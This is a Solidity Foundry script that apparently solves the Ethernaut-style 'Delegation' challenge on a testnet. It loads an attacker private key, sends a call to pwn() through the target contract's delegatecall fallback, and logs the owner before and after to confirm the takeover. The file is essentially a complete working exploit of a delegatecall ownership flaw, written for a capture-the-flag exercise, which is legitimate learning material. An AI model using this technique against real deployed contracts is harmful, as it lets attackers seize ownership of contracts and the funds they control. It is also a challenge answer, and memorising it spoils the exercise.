// SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

import "forge-std/Script.sol";
import {IDelegate} from "src/hack/interfaces/IDelegate.sol";
import {IDelegation} from "src/hack/interfaces/IDelegation.sol";

contract DelegationScript is Script {
    event Owner(address);

    function run() external {
        address delegationAddress = vm.envAddress("DELEGATION_ADDRESS");
        uint attackerKey = vm.envUint("TESTNET_PRIVATE_KEY_1");

        vm.startBroadcast(attackerKey);

        // Original owner
        emit Owner(IDelegation(delegationAddress).owner());

        // This will delegate the call to Delegate contract. Call pwn() and set the attacker as the new owner.
        (bool success, ) = delegationAddress.call(
            abi.encodeCall(IDelegate.pwn, ())
        );

        if (!success) revert("Call Failed!!!");

        // Owner compromised
        emit Owner(IDelegation(delegationAddress).owner());

        vm.stopBroadcast();
        console2.log("SUCCESS!!! Submit the instance.");
    }
}
